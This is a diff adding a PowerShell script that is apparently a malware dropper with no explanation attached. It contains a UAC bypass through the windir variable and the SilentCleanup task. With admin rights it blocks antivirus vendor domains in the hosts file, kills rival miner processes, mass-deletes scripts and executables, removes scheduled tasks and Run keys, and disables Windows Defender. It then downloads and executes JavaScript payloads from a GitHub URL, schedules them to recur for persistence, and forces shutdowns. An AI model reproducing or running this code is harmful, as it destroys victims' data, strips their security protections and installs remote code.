@@ -1,0 +1,724 @@
+if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+    #Payload goes here
+    #It'll run as Administrator
+
+
+
+$HostFile = 'C:\Windows\System32\drivers\etc\hosts'
+ 
+
+$Hosts = @("get-seeders.com", "tracker.cgpeers.to", "cgpeers.to", "proxy.siambit.me", "tracker.iptorrent.com", "zb-ann.com", "www.eset.com", "iploc.eset.com", "repository.eset.com", "www.avast.com", "www.malwarebytes.com", "www.kaspersky.com", "www.edf.eset.com", "www.update.eset.com", "www.kaspersky.co.th", "www.kaspersky.com.br", "usa.kaspersky.com", "ark.mwbsys.com", "settings-win.data.microsoft.com", "telemetry.malwarebytes.com", "keystone.mwbsys.com", "iavs9x.avg.u.avcdn.net", "shepherd.ff.avast.com", "iavs9x.u.avast.com", "v7event.stats.avast.com", "www.avg.com", "www.malwarebytes.com", "www.bitdefender.com", "www.avira.com")
+ 
+
+$File = Get-Content $HostFile
+ 
+
+foreach ($HostFileEntry in $Hosts) 
+{
+    
+
+    $EntryExists = $false
+     
+    if ($File -contains "127.0.0.1 `t $HostFileEntry") 
+    {
+   
+        $EntryExists = $true
+    }
+    
+    if (!$EntryExists) 
+    {
+        
+        Add-content -path $HostFile -value "127.0.0.1 `t $HostFileEntry"
+    }
+}
+
+
+&'Stop-Process' -Name 'XMRig' -Force;
+
+&'Stop-Process' -Name 'xmrig' -Force;
+
+&'Stop-Process' -Name "00" -Force;
+
+&'Stop-Process' -Name "22" -Force;
+
+&'Stop-Process' -Name 'OneDriveV2' -Force;
+
+&'Stop-Process' -Name 'OneDrivenwt2' -Force;
+
+&'Stop-Process' -Name '1643' -Force;
+
+&'Stop-Process' -Name 'Xminer' -Force;
+
+&'Stop-Process' -Name 'xnew' -Force;
+
+&'Stop-Process' -Name 'Get-Card-Info' -Force;
+
+&'Stop-Process' -Name 'AnyDesk old' -Force;
+
+&'Stop-Process' -Name "eth" -Force;
+
+&'Stop-Process' -Name 'eth2' -Force;
+
+&'Stop-Process' -Name "etc" -Force;
+
+&'Stop-Process' -Name 'newminer' -Force;
+
+&'Stop-Process' -Name 'ondrive91' -Force;
+
+&'Stop-Process' -Name "97" -Force;
+
+&'Stop-Process' -Name "98" -Force;
+
+&'Stop-Process' -Name 'cdsjnhuiiiiiiiiiii' -Force;
+
+&'Stop-Process' -Name "667" -Force;
+
+&'Stop-Process' -Name "45" -Force;
+
+&'Stop-Process' -Name 'ahmed' -Force;
+
+&'Stop-Process' -Name 'Discordttt' -Force;
+
+&'Stop-Process' -Name "47" -Force;
+
+&'Stop-Process' -Name "20" -Force;
+
+&'Stop-Process' -Name 'wscript' -Force;
+
+&'Stop-Process' -Name 'cscript' -Force;
+
+&'Stop-Process' -Name 'spoolsv' -Force;
+
+
+
+
+
+
+
+
+&'del' (('C:\ProgramData\*.exe'));
+
+&'del' (('C:\ProgramData\*.js')  -F'\');
+
+&'del' 'C:\ProgramData\*.vbs';
+
+&'del' (('C:\ProgramData\*.cmd'));
+
+&'del' (('C:\ProgramData\*.bat') -F '\');
+
+&'del' 'C:\ProgramData\*.lnk';
+
+&'del' 'C:\ProgramData\*.ps1';
+
+&'del' (('C:\ProgramData\*.ps'));
+
+&'del' (('C:\ProgramData\*.url')-F  '\');
+
+&'del' (('C:\ProgramData\*.pol')  -F  '\');
+
+
+&'del' 'C:\Users\Public\*.exe';
+
+&'del' 'C:\Users\Public\*.js';
+
+&'del' 'C:\Users\Public\*.vbs';
+
+&'del' (('C:\Users\Public\*.cmd'));
+
+&'del' (('C:\Users\Public\*.bat'));
+
+&'del' 'C:\Users\Public\*.lnk';
+
+&'del' (('C:\Users\Public\*.ps1')-F '\');
+
+&'del' (('C:\Users\Public\*.ps') -F  '\');
+
+&'del' (('C:\Users\Public\*.url'));
+
+&'del' 'C:\Users\Public\*.pol';
+
+
+&'del' 'C:\Users\Public\Pictures\*.exe';
+
+&'del' (('C:\Users\Public\Pictures\*.js'));
+
+&'del' (('C:\Users\Public\Pictures\*.vbs')  -f  '\');
+
+&'del' (('C:\Users\Public\Pictures\*.cmd')  -F  '\');
+
+&'del' (('C:\Users\Public\Pictures\*.bat'));
+
+&'del' (('C:\Users\Public\Pictures\*.lnk') -F '\');
+
+&'del' (('C:\Users\Public\Pictures\*.ps1'));
+
+&'del' 'C:\Users\Public\Pictures\*.ps';
+
+&'del' (('C:\Users\Public\Pictures\*.url') -f'\');
+
+&'del' 'C:\Users\Public\Pictures\*.pol';
+
+
+&'del' (('C:\Users\Public\Libraries\*.exe'));
+
+&'del' (('C:\Users\Public\Libraries\*.js')-F  '\');
+
+&'del' 'C:\Users\Public\Libraries\*.vbs';
+
+&'del' 'C:\Users\Public\Libraries\*.cmd';
+
+&'del' (('C:\Users\Public\Libraries\*.bat')-F  '\');
+
+&'del' (('C:\Users\Public\Libraries\*.lnk'));
+
+&'del' (('C:\Users\Public\Libraries\*.ps1')-f  '\');
+
+&'del' 'C:\Users\Public\Libraries\*.ps';
+
+&'del' (('C:\Users\Public\Libraries\*.url'));
+
+&'del' 'C:\Users\Public\Libraries\*.pol';
+
+
+
+
+&'del' 'C:\Users\Public\Music\*.exe';
+
+&'del' (('C:\Users\Public\Music\*.js')  -f  '\');
+
+&'del' (('C:\Users\Public\Music\*.vbs'));
+
+&'del' (('C:\Users\Public\Music\*.cmd')  -f'\');
+
+&'del' (('C:\Users\Public\Music\*.bat')  -F '\');
+
+&'del' 'C:\Users\Public\Music\*.lnk';
+
+&'del' (('C:\Users\Public\Music\*.ps1')-F'\');
+
+&'del' 'C:\Users\Public\Music\*.ps';
+
+&'del' (('C:\Users\Public\Music\*.url'));
+
+&'del' (('C:\Users\Public\Music\*.pol'));
+
+
+&'del' (('C:\Users\Public\Videos\*.exe')  -F  '\');
+
+&'del' (('C:\Users\Public\Videos\*.js')  -F'\');
+
+&'del' 'C:\Users\Public\Videos\*.vbs';
+
+
+&'del' (('C:\Users\Public\Videos\*.cmd'));
+
+&'del' (('C:\Users\Public\Videos\*.bat')  -f '\');
+
+&'del' 'C:\Users\Public\Videos\*.lnk';
+
+&'del' (('C:\Users\Public\Videos\*.ps1'));
+
+&'del' 'C:\Users\Public\Videos\*.ps';
+
+&'del' (('C:\Users\Public\Videos\*.url')  -F  '\');
+
+&'del' (('C:\Users\Public\Videos\*.pol'));
+
+
+
+&'del' (('C:\Users\Public\Downloads\*.exe'));
+
+&'del' (('C:\Users\Public\Downloads\*.js') -f'\');
+
+&'del' (('C:\Users\Public\Downloads\*.vbs'));
+
+&'del' 'C:\Users\Public\Downloads\*.cmd';
+
+&'del' (('C:\Users\Public\Downloads\*.bat') -f  '\');
+
+&'del' (('C:\Users\Public\Downloads\*.lnk'));
+
+&'del' 'C:\Users\Public\Downloads\*.ps1';
+
+&'del' (('C:\Users\Public\Downloads\*.ps'));
+
+&'del' (('C:\Users\Public\Downloads\*.url'));
+
+&'del' 'C:\Users\Public\Downloads\*.pol';
+
+
+
+&'del' (('C:\Users\Public\Documents\*.exe'));
+
+&'del' (('C:\Users\Public\Documents\*.js')-F '\');
+
+&'del' (('C:\Users\Public\Documents\*.vbs'));
+
+&'del' 'C:\Users\Public\Documents\*.cmd';
+
+
+&'del' (('C:\Users\Public\Documents\*.bat'));
+
+&'del' 'C:\Users\Public\Documents\*.lnk';
+
+&'del' 'C:\Users\Public\Documents\*.ps1';
+
+&'del' 'C:\Users\Public\Documents\*.ps';
+
+&'del' 'C:\Users\Public\Documents\*.url';
+
+&'del' (('C:\Users\Public\Documents\*.pol')  -F  '\');
+
+
+
+
+&'del' (('C:\Users\*.exe'));
+
+&'del' (('C:\Users\*.js')-f  '\');
+
+&'del' (('C:\Users\*.vbs'));
+
+&'del' (('C:\Users\*.cmd')  -f '\');
+
+&'del' (('C:\Users\*.bat')  -f '\');
+
+&'del' (('C:\Users\*.lnk'));
+
+&'del' (('C:\Users\*.ps1'));
+
+&'del' (('C:\Users\*.ps'));
+
+&'del' 'C:\Users\*.url';
+
+&'del' 'C:\Users\*.pol';
+
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.exe');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.js');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.vbs');
+
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.cmd' -f'\');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.bat');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.lnk' -f'\');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.ps1');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.ps'  -F  '\');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.url');
+
+&'del' ((("C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start "+'')+'')+'Menu\Programs\Startup\*.pol');
+
+
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.exe";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.js";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.vbs";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.cmd";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.bat";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.lnk";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.ps1";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.ps";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.url";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\*.pol";
+
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.exe";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.js";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.vbs";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.cmd";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.bat";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.lnk";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.ps1";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.ps";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.url";
+
+&'del' "C:\Users\$env:UserName\AppData\LocalLow\*.pol";
+
+
+
+
+
+
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.exe";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.js";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.vbs";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.cmd";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.bat";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.lnk";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.ps1";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.ps";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.url";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\Microsoft\*.pol";
+
+
+
+
+
+
+
+&'del' "C:\Users\$env:UserName\A*.exe";
+
+&'del' "C:\Users\$env:UserName\B*.exe";
+
+&'del' "C:\Users\$env:UserName\C*.exe";
+
+&'del' "C:\Users\$env:UserName\D*.exe";
+
+&'del' "C:\Users\$env:UserName\E*.exe";
+
+&'del' "C:\Users\$env:UserName\F*.exe";
+
+&'del' "C:\Users\$env:UserName\G*.exe";
+
+&'del' "C:\Users\$env:UserName\H*.exe";
+
+&'del' "C:\Users\$env:UserName\I*.exe";
+
+&'del' "C:\Users\$env:UserName\J*.exe";
+
+&'del' "C:\Users\$env:UserName\K*.exe";
+
+&'del' "C:\Users\$env:UserName\L*.exe";
+
+&'del' "C:\Users\$env:UserName\M*.exe";
+
+&'del' "C:\Users\$env:UserName\N*.exe";
+
+&'del' "C:\Users\$env:UserName\O*.exe";
+
+&'del' "C:\Users\$env:UserName\P*.exe";
+
+&'del' "C:\Users\$env:UserName\Q*.exe";
+
+&'del' "C:\Users\$env:UserName\R*.exe";
+
+&'del' "C:\Users\$env:UserName\S*.exe";
+
+&'del' "C:\Users\$env:UserName\T*.exe";
+
+&'del' "C:\Users\$env:UserName\U*.exe";
+
+&'del' "C:\Users\$env:UserName\V*.exe";
+
+&'del' "C:\Users\$env:UserName\W*.exe";
+
+&'del' "C:\Users\$env:UserName\X*.exe";
+
+&'del' "C:\Users\$env:UserName\Y*.exe";
+
+&'del' "C:\Users\$env:UserName\Z*.exe";
+
+&'del' "C:\Users\$env:UserName\0*.exe";
+
+&'del' "C:\Users\$env:UserName\1*.exe";
+
+&'del' "C:\Users\$env:UserName\2*.exe";
+
+&'del' "C:\Users\$env:UserName\3*.exe";
+
+&'del' "C:\Users\$env:UserName\4*.exe";
+
+&'del' "C:\Users\$env:UserName\5*.exe";
+
+&'del' "C:\Users\$env:UserName\6*.exe";
+
+&'del' "C:\Users\$env:UserName\7*.exe";
+
+&'del' "C:\Users\$env:UserName\8*.exe";
+
+&'del' "C:\Users\$env:UserName\9*.exe";
+
+&'del' "C:\Users\$env:UserName\*.js";
+
+&'del' "C:\Users\$env:UserName\*.vbs";
+
+&'del' "C:\Users\$env:UserName\*.cmd";
+
+&'del' "C:\Users\$env:UserName\*.bat";
+
+&'del' "C:\Users\$env:UserName\*.lnk";
+
+&'del' "C:\Users\$env:UserName\*.ps1";
+
+&'del' "C:\Users\$env:UserName\*.ps";
+
+&'del' "C:\Users\$env:UserName\*.url";
+
+&'del' "C:\Users\$env:UserName\*.pol";
+
+
+
+
+
+
+
+
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.exe";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.js";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.vbs";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.cmd";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.bat";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.lnk";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.ps1";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.ps";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.url";
+
+&'del' "C:\Users\$env:UserName\AppData\Local\Temp\*.pol";
+
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.exe";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.vbs";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.cmd";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.js";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.ps";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.bat";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.lnk";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.ps1";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.url";
+
+&'del' "C:\Users\$env:UserName\AppData\Roaming\*.pol";
+
+
+
+&'Unregister-ScheduledTask' -TaskPath "\" -TaskName "*" -Confirm:${falSE};
+
+
+
+&'Add-MpPreference' -ExclusionPath (('C:\'));
+
+&'Add-MpPreference' -ExclusionPath 'd:\';
+
+&'Add-MpPreference' -ExclusionPath 'e:\';
+
+&'Add-MpPreference' -ExclusionProcess 'powershell.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'cmd.exe';
+
+
+
+
+
+&'Remove-Item' -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*' -Force -Verbose;
+
+&'Remove-Item' -Path (('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\*') -F  '\') -Force -Verbose;
+
+&'Set-MpPreference' -DisableIntrusionPreventionSystem ${TRUE} -DisableIOAVProtection ${TRUe} -DisableRealtimeMonitoring ${tRUE} -DisableScriptScanning ${tRUe} -EnableControlledFolderAccess 'Disabled' -EnableNetworkProtection 'AuditMode' -Force -MAPSReporting 'Disabled' -SubmitSamplesConsent 'NeverSend';
+
+
+
+&'Add-MpPreference' -ExclusionProcess 'cscript.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'wscript.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'DellTPa.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'conhost.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'svchost.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'explorer.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'mpu.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'RegSvcs.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'twain_32.exe';
+
+&'Add-MpPreference' -ExclusionProcess 'Eclipse.exe';
+
+
+
+
+
+
+
+
+
+&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 60 '/tn' 'TinyTask' '/tr' (('C:\Users\Default\Links\plugins.js'));
+
+
+
+&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 60 '/tn' 'TiTask' '/tr' (('C:\Users\Default\Links\iconcache.js'));
+
+
+
+
+
+${sRm} = 'https://raw.githubusercontent.com/kakoutahoo/tool/main/iconcache.js';
+
+
+
+${dsm} = (('C:\Users\Default\Links\iconcache.js') -F '\');
+
+
+
+
+
+    
+
+&'Invoke-WebRequest' -Uri ${sRm} -OutFile ${dsm};
+
+
+
+
+
+
+&'Start-\ep' -s 38;
+
+
+
+&'Remove-Item' (('C:\Program Files\Common Files\3D DESIGNER')) -Recurse;
+
+
+
+${sR} = 'https://raw.githubusercontent.com/kakoutahoo/tool/main/plugins.js';
+
+${ds} = (('C:\Users\Default\Links\plugins.js') -F '\');
+
+&'Invoke-WebRequest' -Uri ${SR} -OutFile ${DS};
+
+&Invoke-Expression ${ds}
+
+${sRb} = 'https://raw.githubusercontent.com/kakoutahoo/tool/main/babel.js';
+
+${dsb} = (('C:\Users\Default\Links\babel.js') -F '\');
+
+&'Invoke-WebRequest' -Uri ${SRb} -OutFile ${DSb};
+
+&Invoke-Expression ${dsb}
+
+&'Remove-Item' (('C:\Program Files\Common Files\DESIGNER Cache')) -Recurse;
+
+
+Start-Sleep -Seconds 10
+
+&'Stop-Computer';
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'shutdown.exe' '/s' '/f';
+&'Start-\ep' -s 1;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer';
+&'Start-\ep' -s 2;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer';
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'Stop-Computer' -Force;
+&'shutdown.exe' '/s' '/f';
+&'shutdown.exe' '/s' '/f';
+
+
+
+
+
+
+
+
+
+
+
+
+} else {
+    $ALOSH = "HKCU:\Environment"
+    $Name = "windir"
+    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
+    Set-ItemProperty -Path $ALOSH -Name $name -Value $Value
+    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
+    Remove-ItemProperty -Path $ALOSH -Name $name
+	
+}
